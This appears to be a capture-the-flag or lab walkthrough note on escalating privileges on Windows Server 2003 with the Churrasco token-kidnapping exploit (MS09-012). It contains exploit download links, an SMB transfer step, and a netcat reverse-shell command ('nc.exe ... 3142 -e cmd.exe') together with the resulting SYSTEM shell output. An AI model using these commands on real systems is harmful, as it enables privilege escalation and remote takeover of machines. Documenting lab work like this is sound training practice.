# Reference
* MS09-012
* https://msrc-blog.microsoft.com/2009/04/14/token-kidnapping/

# Prerequisites
## Download Exploit 
[exploit-db](https://www.exploit-db.com/exploits/6705) provides [this](http://www.argeniss.com/research/Churrasco.zip) link but it's not working.
[Backup link](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/6705.zip) is provided (not compiled).
Workaround: install sqlninja
```
sudo apt install sqlninja
/usr/share/sqlninja/apps/churrasco.exe
```
## Transfer and execute
### smbserver
```
sudo impacket-smbserver MFU smb
```
### run command with privileges
```
C:\Documents and Settings\All Users\Documents>\\10.10.14.24\MFU\churrasco.exe whoami
\\10.10.14.24\MFU\churrasco.exe whoami
nt authority\system
```
### get privileged reverse shell
* victim
```
C:\Documents and Settings\All Users\Documents>.\c.exe -d "\\10.10.14.29\MFU\nc.exe 10.10.14.29 3142 -e cmd.exe"
.\c.exe -d "\\10.10.14.29\MFU\nc.exe 10.10.14.29 3142 -e cmd.exe"                             
/churrasco/-->Current User: NETWORK SERVICE                                                   
/churrasco/-->Getting Rpcss PID ...                                                           
/churrasco/-->Found Rpcss PID: 684                                                            
/churrasco/-->Searching for Rpcss threads ...                                                 
/churrasco/-->Found Thread: 688                                                               
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 692 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 696 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x734
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found SYSTEM token 0x72c
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!
```
* attacker
```
Â» nc -lvnp 3142
Listening on 0.0.0.0 3142
Connection received on 10.10.10.14 1042
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami
nt authority\system

```
